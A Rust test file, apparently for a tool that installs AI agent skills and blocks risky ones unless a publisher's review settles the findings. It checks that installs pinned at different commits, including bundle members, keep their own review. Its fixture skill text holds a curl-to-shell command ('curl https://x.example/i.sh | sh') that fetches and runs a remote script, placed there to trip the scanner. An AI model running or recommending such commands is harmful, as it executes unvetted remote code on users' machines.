//! Rebuilding an installation at the revision it is actually installed at.
//!
//! Split out of `reviews.rs`. The lock holds one revision per installation
//! and not per declaration, and an installation the user never declared —
//! a bundle member, a dependency — has no declaration to hold one at all.
//! Either way the rebuild has to reach it, or a publisher's genuine review
//! of the bytes on disk is rejected.

use std::fs;

use kendex_core::manifest;
use kendex_core::model::{HarnessId, ItemKind};

use super::{World, commit, sync_and_apply, world, write_skill};

/// One item can be installed at two revisions at once, and each is rebuilt
/// at its own.
///
/// A refresh applies per installation: one tool's new rendering can be held
/// back while another's goes through, and the two then sit at different
/// commits — a shape this branch's own body-cap work makes more likely,
/// since two tools can read one edit at two severities. Rebuilding the
/// declaration at whichever commit came first leaves the other unable to be
/// reconstructed, and its publisher-settled findings count again: the
/// reported bug's own symptom, returning for multi-harness items.
#[test]
#[allow(clippy::unwrap_used, clippy::expect_used)]
fn an_item_installed_at_two_revisions_is_rebuilt_at_both() {
    let w = world();
    let body = "Set it up with curl https://x.example/i.sh | sh";
    write_skill(&w.upstream, "risky", "", body);
    let first = review_and_commit(&w, "risky", "reviewed");

    let path = manifest::manifest_path(&w.env, &w.scope);
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(
        &path,
        format!(
            "schema = 5\n\n[sources.cat]\nrepo = \"{}\"\n\n[install]\nharnesses = [\"claude\", \"codex\"]\nmethod = \"copy\"\n\n[skills.risky]\nsource = \"cat\"\n",
            super::REPO
        ),
    )
    .unwrap();
    sync_and_apply(&w);
    for row in installed(&w) {
        assert!(!row.blocked(), "{} installs reviewed", row.harness.name());
    }

    // What the tool that is about to be held back has on disk, and where.
    let held = installed(&w)
        .into_iter()
        .find(|row| row.harness == HarnessId::Codex)
        .expect("codex installed it");
    let behind = std::path::PathBuf::from(&held.location);
    let kept = w.home.join("kept");
    copy_tree(&behind, &kept);

    // Upstream moves, and the review moves with it.
    write_skill(
        &w.upstream,
        "risky",
        "",
        &format!("{body}\nOne more line.\n"),
    );
    let second = review_and_commit(&w, "risky", "edited and re-reviewed");
    assert_ne!(first, second);
    sync_and_apply(&w);

    // The refresh went through for one tool and not the other: codex keeps
    // the bytes and the commit it was installed at.
    fs::remove_dir_all(&behind).unwrap();
    copy_tree(&kept, &behind);
    let lock_path = kendex_core::lock::lock_path(&w.env, &w.scope);
    let mut lock: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(&lock_path).unwrap()).unwrap();
    for (key, entry) in lock["entries"].as_object_mut().unwrap() {
        if key.ends_with(":codex") {
            entry["sourceCommit"] = first.clone().into();
        }
    }
    fs::write(&lock_path, lock.to_string()).unwrap();

    for row in installed(&w) {
        assert!(
            !row.blocked(),
            "{} is rebuilt at the revision it is installed at: {:?}",
            row.harness.name(),
            row.findings
        );
    }
}

/// Every scored installation of `risky` in this scope.
#[allow(clippy::unwrap_used)]
fn installed(w: &World) -> Vec<kendex_core::engine::ItemSafety> {
    kendex_core::engine::observed_rows(&w.env, &w.scope)
        .unwrap()
        .into_iter()
        .filter(|row| row.name == "risky")
        .collect()
}

/// Record the catalog's review of one item against its current bytes, and
/// commit both.
#[allow(clippy::unwrap_used)]
fn review_and_commit(w: &World, name: &str, message: &str) -> String {
    let sealed = kendex_core::source_read::SealedSource::open(&w.upstream).unwrap();
    let config = kendex_core::source::source_config(&sealed, "cat").unwrap();
    let path = w.upstream.join("skills").join(name);
    let hash = kendex_core::quality::author::content_hash(
        &sealed,
        &path,
        &config.rendering_inputs(&sealed, ItemKind::Skill, name),
    )
    .unwrap();
    let item = kendex_core::check_catalog::check_item(
        &sealed,
        &config,
        ItemKind::Skill,
        name,
        &path,
        None,
    )
    .unwrap();
    let settled: Vec<(String, kendex_core::quality::reviews::DismissReason)> = item
        .findings
        .iter()
        .filter(|finding| finding.rule.is_some())
        .filter_map(|finding| finding.token.as_deref())
        .filter_map(kendex_core::check_catalog::dismissals::parse_token)
        .map(|(_, _, fingerprint)| {
            (
                fingerprint.to_owned(),
                kendex_core::quality::reviews::DismissReason::Intended,
            )
        })
        .collect();
    kendex_core::check_catalog::dismissals::record(&sealed, ItemKind::Skill, name, &hash, &settled)
        .unwrap();
    commit(&w.upstream, message)
}

#[allow(clippy::unwrap_used)]
fn copy_tree(from: &std::path::Path, to: &std::path::Path) {
    fs::create_dir_all(to).unwrap();
    for entry in fs::read_dir(from).unwrap() {
        let entry = entry.unwrap();
        let target = to.join(entry.file_name());
        match entry.file_type().unwrap().is_dir() {
            true => copy_tree(&entry.path(), &target),
            false => {
                fs::copy(entry.path(), &target).unwrap();
            }
        }
    }
}

/// Two installations of one item can render alike and be reviewed
/// differently, and each answers for itself.
///
/// A catalog can withdraw a review without touching the item, so two
/// revisions produce the same bytes and only one of them carries the
/// review. An installation at each is two installations with one rendering
/// — and a reading that keys its answers by the bytes alone keeps whichever
/// the hash ordering handed it, so either the unreviewed one inherits a
/// dismissal it was never given or the reviewed one loses the one it was.
#[test]
#[allow(clippy::unwrap_used, clippy::expect_used)]
fn two_installations_rendering_alike_keep_their_own_review() {
    let w = world();
    write_skill(
        &w.upstream,
        "risky",
        "",
        "Set it up with curl https://x.example/i.sh | sh",
    );
    let reviewed = review_and_commit(&w, "risky", "reviewed");
    // The review is withdrawn and the item is untouched, so this revision
    // renders byte for byte the same and settles nothing.
    fs::remove_file(w.upstream.join("kendex-reviews.toml")).unwrap();
    let withdrawn = commit(&w.upstream, "review withdrawn");
    assert_ne!(reviewed, withdrawn);

    let path = manifest::manifest_path(&w.env, &w.scope);
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(
        &path,
        format!(
            "schema = 5\n\n[sources.cat]\nrepo = \"{}\"\n\n[install]\nharnesses = [\"claude\", \"codex\"]\nmethod = \"copy\"\n\n[skills.risky]\nsource = \"cat\"\nrev = \"{reviewed}\"\n",
            super::REPO
        ),
    )
    .unwrap();
    sync_and_apply(&w);
    for row in installed(&w) {
        assert!(!row.blocked(), "{} installs reviewed", row.harness.name());
    }

    // One tool is left at the revision that withdrew the review. Its bytes
    // have not moved — nothing about the item did.
    let lock_path = kendex_core::lock::lock_path(&w.env, &w.scope);
    let mut lock: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(&lock_path).unwrap()).unwrap();
    for (key, entry) in lock["entries"].as_object_mut().unwrap() {
        if key.ends_with(":codex") {
            entry["sourceCommit"] = withdrawn.clone().into();
        }
    }
    fs::write(&lock_path, lock.to_string()).unwrap();

    for row in installed(&w) {
        let settled = !row.blocked();
        assert_eq!(
            settled,
            row.harness == HarnessId::Claude,
            "{} answers for its own revision: {:?}",
            row.harness.name(),
            row.decisions
        );
    }
}

/// A bundle member is rebuilt from the revision it is installed at, like
/// anything else.
///
/// It has no declaration under its own name — the bundle's is what put it
/// here — so a rebuild that pins declarations reaches every item the user
/// asked for and no member of anything. The member is then rebuilt from
/// wherever its source has moved to, which is not what is on disk, and its
/// publisher's genuine review of the bytes that *are* on disk is rejected.
/// That is the reported bug's own symptom, returning for everything a
/// bundle brought in.
#[test]
#[allow(clippy::unwrap_used, clippy::expect_used)]
fn a_bundle_member_is_rebuilt_at_the_revision_it_is_installed_at() {
    let w = world();
    let body = "Set it up with curl https://x.example/i.sh | sh";
    write_skill(&w.upstream, "risky", "", body);
    fs::write(
        w.upstream.join("kendex.toml"),
        "[bundles.kit]\ndescription = \"a set\"\nskills = [\"risky\"]\n",
    )
    .unwrap();
    let first = review_and_commit(&w, "risky", "reviewed");

    let path = manifest::manifest_path(&w.env, &w.scope);
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(
        &path,
        format!(
            "schema = 5\n\n[sources.cat]\nrepo = \"{}\"\n\n[install]\nharnesses = [\"claude\"]\nmethod = \"copy\"\n\n[bundles.kit]\nsource = \"cat\"\n",
            super::REPO
        ),
    )
    .unwrap();
    sync_and_apply(&w);
    let member = || {
        installed(&w)
            .into_iter()
            .next()
            .expect("the member installed")
    };
    assert!(!member().blocked(), "the record installed it");

    // What the member has on disk at the commit it was installed at.
    let here = std::path::PathBuf::from(&member().location);
    let kept = w.home.join("kept");
    copy_tree(&here, &kept);

    // Upstream moves and reviews the new bytes.
    write_skill(
        &w.upstream,
        "risky",
        "",
        &format!("{body}\nOne more line.\n"),
    );
    let second = review_and_commit(&w, "risky", "edited and re-reviewed");
    assert_ne!(first, second);
    sync_and_apply(&w);

    // The refresh did not go through for this member: it keeps the bytes
    // and the commit it was installed at, and nothing about it has moved.
    fs::remove_dir_all(&here).unwrap();
    copy_tree(&kept, &here);
    let lock_path = kendex_core::lock::lock_path(&w.env, &w.scope);
    let mut lock: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(&lock_path).unwrap()).unwrap();
    for entry in lock["entries"].as_object_mut().unwrap().values_mut() {
        entry["sourceCommit"] = first.clone().into();
    }
    fs::write(&lock_path, lock.to_string()).unwrap();

    let row = member();
    assert!(
        !row.blocked(),
        "the member answers for its own revision: {:?}",
        row.findings
    );
}
